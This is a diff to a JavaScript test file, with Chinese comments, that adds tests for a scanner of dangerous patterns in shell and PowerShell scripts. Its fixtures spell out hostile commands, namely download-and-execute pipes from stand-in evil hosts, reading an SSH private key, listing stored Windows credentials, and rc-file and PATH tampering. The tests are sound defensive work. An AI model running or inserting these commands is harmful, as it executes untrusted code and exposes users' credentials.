@@ -719,6 +719,34 @@ function mockFetch(payload, status = 200) {
   check("detectTypeDetail 无特征 → instructions + none 理由",
     [dtNone.type, dtNone.reasonKey, dtNone.hintKey],
     ["instructions", "detectReason.none", "detectHint.none"]);
+  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项，四类模式）
+  const hazDir = join(process.env.DSH_HOME, "hazard-fixtures");
+  const mkHaz = (name, content) => {
+    const f = join(hazDir, name);
+    mkdirSync(dirname(f), { recursive: true });
+    writeFileSync(f, content, "utf8");
+    return f;
+  };
+  const shHits = await lib.scanScriptHazards(mkHaz("evil.sh", [
+    "#!/bin/sh",
+    "curl -s https://evil.example/x.sh | sh",
+    "cat ~/.ssh/id_rsa",
+    "echo alias >> ~/.bashrc"
+  ].join("\n")));
+  check("scanScriptHazards sh 三类命中", shHits.map((h) => h.category),
+    ["downloadExec", "credRead", "rcModify"]);
+  check("scanScriptHazards 行号与内容", shHits.map((h) => [h.line, h.text]),
+    [[2, "curl -s https://evil.example/x.sh | sh"], [3, "cat ~/.ssh/id_rsa"], [4, "echo alias >> ~/.bashrc"]]);
+  const ps1Hits = await lib.scanScriptHazards(mkHaz("evil.ps1", [
+    "irm https://x/evil.ps1 | iex",
+    'setx PATH "C:\\evil;%PATH%"',
+    "cmdkey /list"
+  ].join("\n")));
+  check("scanScriptHazards ps1 三类命中", ps1Hits.map((h) => h.category),
+    ["downloadExec", "pathStartup", "credRead"]);
+  check("scanScriptHazards 干净脚本无命中",
+    (await lib.scanScriptHazards(mkHaz("clean.ps1", "Write-Host 'hi'\nNew-Item -Path ./out\n"))).length, 0);
+  check("scanScriptHazards 文件缺失返回空", (await lib.scanScriptHazards(join(hazDir, "nope.sh"))).length, 0);
 
   console.log(`\n${pass} passed, ${fail} failed`);
   process.exit(fail === 0 ? 0 : 1);
